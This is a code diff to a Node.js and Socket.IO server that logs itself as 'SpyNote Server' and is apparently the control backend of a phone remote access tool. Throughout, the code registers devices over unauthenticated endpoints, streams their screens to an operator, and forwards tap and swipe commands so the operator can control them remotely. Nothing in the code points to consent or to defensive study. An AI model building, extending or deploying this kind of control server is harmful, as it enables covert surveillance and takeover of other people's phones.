@@ -14,18 +14,27 @@ const io = socketIo(server, {
 });
 
 app.use(compression());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 app.use(express.json({ limit: '200mb' }));
 app.use(express.urlencoded({ limit: '200mb', extended: true }));
 
 const devices = new Map();
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+app.post('/register', (req, res) => {
+    const { deviceId, model, brand, version, status } = req.body;
+    if (deviceId) {
+        devices.set(deviceId, { model, brand, version, status, connected: true });
+        io.emit('devices-update', Array.from(devices.entries()));
+    }
+    res.json({ success: true });
+});
+
+app.get('/devices', (req, res) => {
+    res.json(Array.from(devices.entries()));
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Client connected:', socket.id);
+    console.log('🔗 Client connected:', socket.id);
 
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
@@ -33,17 +42,14 @@ io.on('connection', (socket) => {
             devices.set(deviceId, { 
                 ...deviceInfo, 
                 connected: true, 
-                socketId: socket.id,
-                width: deviceInfo.width || 1080,
-                height: deviceInfo.height || 2340
+                socketId: socket.id 
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log('📱 Device registered:', deviceId, deviceInfo.model);
+            console.log('📱 Device registered:', deviceId);
         }
     });
 
-    // 🔥 ULTRA SMOOTH 30FPS + LAYOUT
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
@@ -52,28 +58,31 @@ io.on('connection', (socket) => {
                 data: data.data,
                 width: data.width,
                 height: data.height,
-                layout: data.layout || [],
-                timestamp: data.timestamp
+                timestamp: data.timestamp,
+                layout: data.layout,
+                fps: data.fps
             });
         }
     });
 
-    // 🔥 PRECISE CONTROLS
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
                 action,
-                x: parseFloat(x || 0),
-                y: parseFloat(y || 0),
-                startX: parseFloat(startX || 0),
-                startY: parseFloat(startY || 0),
-                endX: parseFloat(endX || 0),
-                endY: parseFloat(endY || 0),
+                x: parseFloat(x),
+                y: parseFloat(y),
+                startX: parseFloat(startX),
+                startY: parseFloat(startY),
+                endX: parseFloat(endX),
+                endY: parseFloat(endY),
                 duration: parseInt(duration) || 300
             });
-            console.log('🎮 Control:', action, 'on', deviceId);
         }
+    });
+
+    socket.on('ping', () => {
+        socket.emit('pong', Date.now() - socket.handshake.time);
     });
 
     socket.on('disconnect', () => {
@@ -88,8 +97,6 @@ io.on('connection', (socket) => {
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server LIVE on port ${PORT}`);
-    console.log('📱 Serve index.html from /public/ folder');
+server.listen(process.env.PORT || 3000, () => {
+    console.log('🚀 SpyNote Server running on port', process.env.PORT || 3000);
 });
